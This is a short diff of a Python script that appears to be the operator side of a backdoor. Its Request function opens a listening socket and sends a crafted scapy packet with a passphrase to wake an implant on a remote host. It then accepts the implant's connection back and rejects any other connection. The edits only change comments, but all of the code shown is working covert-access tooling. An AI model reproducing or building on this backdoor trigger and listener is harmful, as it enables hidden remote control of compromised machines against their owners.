@@ -26,13 +26,13 @@ def Request(lHost, lPort, rHost, rPort):
 	global prompt
 	global username
 	global sep
-	nbattempts = 3 # Let give it 3 attempts. If all fail just give up
+	nbattempts = 3
 	while nbattempts > 0:
 		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Reuse a socket even if it has been recently closed and is timing.
-		skt.settimeout(3) # Wait up to 3 sec on blocking method
+		skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		skt.settimeout(3)
 		skt.bind((lHost, lPort)) # open the socket
-		skt.listen(1) # only 1 connection accepted at the same time
+		skt.listen(1) # only 1 connection accepted at a time
 		# Emit a scapy TCP packet containing the appropriate passphrase in order to wake up the backdoor
 		send(IP(src=lHost, dst=rHost)/TCP(sport=lPort, dport=rPort, flags="A")/Raw(load="passphrase1"), verbose=0) 
 		try:
@@ -41,7 +41,7 @@ def Request(lHost, lPort, rHost, rPort):
 			port = sender[1]
 			if addr == rHost or port == rPort: # check if the source is what we expect : The dest of a scapy packet
 				break
-			else : # sth connected but it's not our backdoor
+			else : # connected but it's not our backdoor
 				skt.close()
 				nbattempts -= 1
 				print("[!] Warning : Received unauthorized connection request... Connection refused")
